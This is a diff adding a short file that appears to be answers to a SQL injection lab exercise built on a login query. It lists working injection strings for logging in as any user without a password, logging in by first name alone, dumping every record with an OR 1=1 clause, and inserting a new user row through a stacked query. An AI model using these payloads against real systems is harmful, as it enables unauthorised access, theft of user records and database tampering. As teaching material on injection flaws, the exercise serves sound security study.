@@ -1,0 +1,25 @@
+Query String: SELECT * FROM users WHERE uname='<input>' AND passwd=PASSWORD('')
+
+1. Impersonate (i.e. log in as) any user, without providing the password
+
+<input> = <username>' UNION SELECT * FROM users WHERE uname = '
+
+example: if <username> = jacob, then...
+
+    <input> = jacob' UNION SELECT * FROM users WHERE uname = '
+
+2. Impersonate any user without username and without password. Pretend that you only know the first name of the user.
+
+<input> = ' OR first = '<firstname>' UNION SELECT * FROM users WHERE uname = '
+
+Example: if <firstname> = Jacob, then...
+
+    <input> = ' OR first = 'Jacob' UNION SELECT * FROM users WHERE uname = '
+
+3. Steal all records in the table
+
+<input> = ' OR 1 = 1 UNION SELECT * FROM users WHERE uname = '
+
+4. Insert a record
+
+<input> = '; INSERT INTO users (first, uname, passwd, profile) VALUES ('Jace2', 'jace-kline2', PASSWORD('password'), 'Hello there. I forgot to password hash my original record.'); SELECT * FROM users WHERE uname = '
